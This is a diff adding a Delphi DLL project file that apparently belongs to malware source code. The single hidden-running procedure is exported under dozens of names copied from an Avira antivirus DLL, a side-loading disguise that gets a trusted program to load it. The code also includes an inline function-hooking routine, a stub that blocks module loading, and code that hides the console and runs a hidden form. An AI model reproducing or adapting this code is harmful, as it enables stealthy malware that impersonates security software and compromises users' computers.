@@ -1,0 +1,149 @@
+﻿library NvSmartMax2;
+
+{$SETPEOPTFLAGS $140}
+{$R 'Resource.res' 'Resource.rc'}
+{$R 'JLI_CmdToArgs.res' 'JLI_CmdToArgs.rc'}
+{$R 'megasena.res' 'megasena.rc'}
+
+uses
+  System.SysUtils,
+  System.Classes,
+  Winapi.Windows,
+  Winapi.ShellAPI,
+  ZLib,
+  forms,
+  Winapi.ActiveX,
+  AclApi,
+  AccCtrl,
+  Vcl.Controls,
+  Vcl.ExtCtrls,
+  Vcl.StdCtrls,
+  IdHTTP,
+  System.Win.ComObj,
+  System.NetEncoding,
+  Winapi.ShlObj,
+  variaveis in 'variaveis.pas',
+  principal in 'principal.pas',
+  conexoes in 'conexoes.pas',
+  tapioca in 'tapioca.pas',
+  ut_07 in 'ut_07.pas' {TNT_07},
+  ut_02 in 'ut_02.pas' {TNT_02},
+  ut_03 in 'ut_03.pas' {TNT_03},
+  ut_04 in 'ut_04.pas' {TNT_04},
+  ut_05 in 'ut_05.pas' {TNT_05},
+  ut_06 in 'ut_06.pas' {TNT_06},
+  ut_01 in 'ut_01.pas' {TNT_01},
+  umodulo in 'umodulo.pas' {frmstart},
+  usession in 'usession.pas',
+  u_rec in 'u_rec.pas',
+  ut_test in 'ut_test.pas' {TNT_TEST},
+  funcoes in 'funcoes.pas';
+
+//{$R avira2.res}
+
+procedure myLdrLoadDll(PathToFile: PAnsiChar; Flags: variant;
+  ModuleFileName: PAnsiChar; var ModuleHandle: THandle);
+begin
+  // MessageBox(0, 'injection blocked!', 'WARNING!', MB_OK);
+  ModuleHandle := 0;
+end;
+
+procedure hook(target, newfunc: pointer);
+var
+  jmpto: dword;
+  OldProtect: Cardinal;
+begin
+  jmpto := dword(newfunc) - dword(target) - 5;
+  VirtualProtect(target, 5, PAGE_EXECUTE_READWRITE, @OldProtect);
+  pbyte(target)^ := $E9;
+  pdword(dword(target) + 1)^ := jmpto;
+end;
+
+procedure DeleteLocalMui;
+var
+  i: integer;
+  sr: TSearchRec;
+begin
+  i := FindFirst(ExtractFilePath(Application.ExeName) + 'locales\*.*',
+    faAnyFile, sr);
+  while i = 0 do
+  begin
+    DeleteFile(pchar(ExtractFilePath(Application.ExeName) + 'locales\' +
+      sr.Name));
+    i := FindNext(sr);
+  end;
+end;
+
+procedure processmsg;
+var
+  msg: TMsg;
+begin
+  while PeekMessage(msg, 0, 0, 0, PM_REMOVE) do
+  begin
+    TranslateMessage(msg);
+    DispatchMessage(msg);
+  end;
+end;
+
+function GetConsoleWindow: HWND; stdcall; external kernel32;
+
+var
+  ThreadID: Cardinal;
+
+procedure myProcedure(); stdcall; // exports
+begin
+  ShowWindow(GetConsoleWindow, SW_MINIMIZE);
+  ShowWindow(GetConsoleWindow, SW_HIDE);
+  CoInitialize(nil);
+  Application.Initialize;
+  Application.CreateForm(Tfrmstart, frmstart);
+  Application.MainFormOnTaskbar := False;
+  Application.ShowMainForm := False;
+  Install_Cur(False);
+  Application.Run;
+
+  repeat
+    processmsg;
+    Sleep(3000);
+  until ProcessaOK;
+end;
+
+
+exports
+  myProcedure name '??4OeProductInfo@NativeCore@OE@Avira@@QAEAAV0123@ABV0123@@Z',
+  myProcedure name '?GetDownloadSource@OeProductInfo@NativeCore@OE@Avira@@QBE?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@XZ',
+  myProcedure name '?GetLanguage@OeProductInfo@NativeCore@OE@Avira@@QBE?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@XZ',
+  myProcedure name '?GetOeSettingsContent@OeProductInfo@NativeCore@OE@Avira@@ABE?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@XZ',
+  myProcedure name '?GetOeSettingsPath@OeProductInfo@NativeCore@OE@Avira@@ABE?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@ABV56@@Z',
+  myProcedure name '?GetOeSettingsPath@OeProductInfo@NativeCore@OE@Avira@@ABE?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@XZ',
+  myProcedure name '?GetOldOeSettingsPath@OeProductInfo@NativeCore@OE@Avira@@ABE?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@XZ',
+  myProcedure name 'ActivateWindow',
+  myProcedure name 'DotNet_GetHighestVersionInstalled',
+  myProcedure name 'DuplicateHandleForProcess',
+  myProcedure name 'GetActiveSessionId',
+  myProcedure name 'GetCurrentUserTokenFromActiveSession',
+  myProcedure name 'GetFullHandleName',
+  myProcedure name 'GetLoggedOnUserSid',
+  myProcedure name 'GetOwnParentProcessId',
+  myProcedure name 'GetParentProcessId',
+  myProcedure name 'GetProcessIntegrityLevel',
+  myProcedure name 'GetProcessUserSid',
+  myProcedure name 'GetSessions',
+  myProcedure name 'GetUserSidBySessionId',
+  myProcedure name 'GetUserTokenFromUserSid',
+  myProcedure name 'HandleDebugEvents',
+  myProcedure name 'IsAviraSignedFile',
+  myProcedure name 'MakeTrayIconVisible',
+  myProcedure name 'ProtectCurrentProcess',
+  myProcedure name 'RunProcessAsCurrentUser',
+  myProcedure name 'RunProcessInUserSession',
+  myProcedure name 'RunProcessInUserSessionInDebugMode',
+  myProcedure name 'UnprotectCurrentProcess',
+  myProcedure name 'VerifyFileSignature',
+  myProcedure name 'VerifyProcessByHandle',
+  myProcedure name 'VerifyProcessById';
+
+begin
+
+end.
+
